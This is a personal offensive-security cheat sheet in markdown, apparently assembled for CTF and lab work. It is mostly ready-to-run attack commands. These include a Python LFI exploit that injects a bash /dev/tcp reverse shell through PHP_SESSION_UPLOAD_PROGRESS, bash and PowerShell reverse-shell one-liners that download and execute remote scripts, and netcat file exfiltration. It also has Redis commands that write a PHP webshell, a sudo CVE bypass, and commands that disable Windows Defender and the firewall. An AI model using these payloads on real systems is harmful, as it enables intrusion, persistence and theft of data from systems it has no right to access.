# My Security Resources

[TOC]

## Scan
### Portscan
- nmap
    - Parameters
        - `-A` : Enable OS detection, version detection, script scanning, and traceroute
        - `-p-` : Scan all ports
        - `-p 1000-9999` : Scan port from 1000 to 9999 
- RustScan
	- `rustscan -a 10.10.166.15`
	    - `-r 1-65535` : Port range from 1 to 65535
### Services
- enum4linux
    - Parameters
        - `-a` : Do all simple enumeration
## Web
### Scan
- [Dirsearch](https://github.com/maurosoria/dirsearch)
- [Githack-python3](https://github.com/tigert1998/GitHack-py3)
- [FFUF](https://github.com/ffuf/ffuf)
    - Fuzz sub-domain
        - `ffuf -c -w /usr/share/dnsrecon/subdomains-top1mil-20000.txt -u http://{domain.name}/ -H "Host: FUZZ.{domain.name}" -fs {normal_size}`
### Server
#### Apache
- Default log path
    - `/var/log/apache2/access.log`
#### Nginx
#### Tomcat
- Tomcat Path
    - `/manager/status/all`
    - `/admin/dashboard`
- Path Bypass
    - With `/..;/`
        - e.g. `/manager/status/..;/html/upload`
### PHP
- Bypass `system`
	- `echo passthru("whoami")`
	- `echo shell_exec("whoami")` 
	- `echo exec("whoami")`
- Wrapper
	- `php://filter/convert.base64-encode/resource=meow.php`
- Default Session Path
    - `/var/lib/php/sessions/sess_{sess_name}`
- LFI PHP_SESSION_UPLOAD_PROGRESS (From Splitline)
    ```python
    import grequests
    sess_name = 'meowmeow'
    sess_path = f'/var/lib/php/sessions/sess_{sess_name}'
    base_url = 'http://{target-domain}/{target-path/randylogs.php}'
    param = "file"

    # code = "file_put_contents('/tmp/shell.php','<?php system($_GET[a])');"
    code = '''system("bash -c 'bash -i >& /dev/tcp/{domain}/{port} 0>&1'");'''

    while True:
        req = [grequests.post(base_url,
                              files={'f': "A"*0xffff},
                              data={'PHP_SESSION_UPLOAD_PROGRESS': f"pwned:<?php {code} ?>"},
                              cookies={'PHPSESSID': sess_name}),
               grequests.get(f"{base_url}?{param}={sess_path}")]

        result = grequests.map(req)
        if "pwned" in result[1].text:
            print(result[1].text)
            break
    ```
### JSP / Tomcat
- Webshell
    - https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/jsp/cmd.jsp
        - `jar -cvf cmd.war cmd.jsp` and upload to Tomcat admin
### Defence
- Knockd
	- `/etc/knockd.conf`
	- `nc` port several time to knock
### Web Shell
- [b374k](https://github.com/b374k/b374k)
- [windows-php-reverse-shell](https://github.com/Dhayalanb/windows-php-reverse-shell)

## Shell
### Reverse Shell - Linux
- Prepare
	- `nc -nvlp {port}`
	- `nc -vlk {port}`
- https://reverse-shell.sh/
- [Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- Bash tcp
    - `bash -c 'bash -i >& /dev/tcp/my_ip/7877 0>&1'`
    	- Write file in local first, and use wget/curl to get to victim machine
- Make it moreinteractively
    - `python -c 'import pty; pty.spawn("/bin/bash")'`
### Reverse shell - Windows
- msfvenom
- Powershell
	- https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
	- `powershell iex (New-Object Net.WebClient).DownloadString('http://{my_ip}:{http_port}/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress {my_ip} -Port {shell_port}`

### File Transmission - Linux
- SCP
- HTTP
	- Prepare
		- `python3 -m http.server`
			- use `sudo` to `get` 80 port
	- GET
		- `wget {my_ip}:{port}/{file_name} -O {path_to_output}`
		- `curl -o {path_to_output} http`
- NC
	- Prepare
		- `nc -l -p {attacker_port} > {file}`
	- Send
		- `nc {attacker_ip} {attacker_port} < {file}`
		- End will not notify
### File Transmission - Windows
- HTTP
	- Prepare
		- `python3 -m http.server`
	- GET (Powershell)
		- `wget` , `curl` , `iwr` is alias for `Invoke-WebRequest`
			- `Invoke-WebRequest http://{my_ip}:{my_port}/{file} -outFile {file_name}`
## Server
### Redis
- Write shell / file
	- `redis-cli -h {ip} `
		- Connect
	- `config set dir "/var/www/html"`
		- Set dir
	- `config set dbfilename meow.php`
		- Set file name
	- `set x "\r\n\r\n<?php system($_GET[A]);?>\r\n\r\n"`
		- Write web shell
	- `save`
		- Save file
## Privilege - Linux
### Software
- [GTFOBins](https://gtfobins.github.io/)
    - Linux privileges escalation 
- [PEASS-ng](https://github.com/carlospolop/PEASS-ng) , [LinEnum](https://github.com/rebootuser/LinEnum)
    - Scan the system to find which can be use for privileges escalation
- [Pspy](https://github.com/DominicBreuker/pspy)
    - Monitor the process
### Program Hijack
#### Python
- import library priority
	1. local file
	2. `python -c "import sys;print(sys.path)"`
- Check file permission if it can be write 
- Fake library file
	```python
	import pty
	pty.spawn("/bin/bash")
	```
#### Bash
- Relative path is from `$PATH`
	- We can modify this by
		- `PATH=/my/fake/path:$PATH ./binary`
	- Fake path can contain the shell/reverse shell command fle
- Find File
    - `find  / -iname {file_name} -print 2>/dev/null`
`
### Capability
- If the program has some special capability
	- https://man7.org/linux/man-pages/man7/capabilities.7.html
	- `CAP_SETUID`
- Can do with [GTFOBins](https://gtfobins.github.io/)
### Docker
- `/.dockerenv`
	- If exist, probably in docker 
- Notice mount point
### SOP
- Check `sudo -l`
	- What file we can run as super user 
- Check crontab
    - `cat /etc/crontab `
	- With LinEnum, LinPeas
	- PsPy check
- Check SUID / SGID
    - `find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null`
    - `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`
    - With [GTFOBins](https://gtfobins.github.io/)
- Check sudo version
	- [CVE-2019-14287](https://www.exploit-db.com/exploits/47502)
		- sudo < 1.8.28
		- `sudo -u#-1 binary`
- Check $PATH / import library permission
	- Program Hijack
- Check capability
    - `getcap -r / 2>/dev/null`
	- Check if the program has some useful capability
- Check backup file
## Privilege - Windows
### Exploit
- [EternalBlue MS17-010](https://github.com/3ndG4me/AutoBlue-MS17-010)
### Bypass UAC
- [CVE-2019-1388](http://blog.leanote.com/post/snowming/38069f423c76)
### Turn off Defender / Firewall
- 64 bit Powershell
	- `%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe`
-  Disable Realtime Monitoring 
	-  `Set-MpPreference -DisableRealtimeMonitoring $true`
-  Uninstall Defender
	-  `Uninstall-WindowsFeature -Name Windows-Defender –whatif`
	-  `Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet`
-  Turn off firewall
	- `Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False`
### Download File
- `certutil -urlcache -f {URL} {File_name}`
## Password Crack
### Software
- Hydra
    - Crack online services password
        - SMB,SSH,FTP......
    - Usage
        - `hydra -l {username} -P {path_to_wordlist} ssh://{ip_address}`
- John the ripper
    - Crack hash like `/etc/shadow`
    - Support tools
        - [ssh2john](https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py)
        - gpg2john
        - zip2john
        - samdump2
        	- NTLM 2 John
        	- `samdump2 system sam > j.txt`
    - Usage
        - `john {file} --wordlist={wordlist}`
- Hashcat
    - Crack hash 
### Dictionary
- rockyou.txt
- https://github.com/danielmiessler/SecLists
	- [xato-net-10-million-passwords-dup.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/xato-net-10-million-passwords-dup.txt)
### Online
- https://crackstation.net/

## Software
- RDP
	- `xfreerdp +drives /u:{username} /v:{ip}:{port}`
- FTP
	- `ls`
	- `get {file_name}`
	- `put {file_name}`
## Forensics
- Unknown files
	- `file {file_name}`
	- `binwalk {file_name}`
	- `xxd {file_name}`
### Steganography
- [stegsolve](https://github.com/zardus/ctf-tools/tree/master/stegsolve)
- [zsteg](https://github.com/zed-0xff/zsteg)
- [steghide](http://steghide.sourceforge.net/)
	- `steghide extract -sf {file_name}`
- exiftool

<!-- todo


https://github.com/CptGibbon/CVE-2021-3156

-->
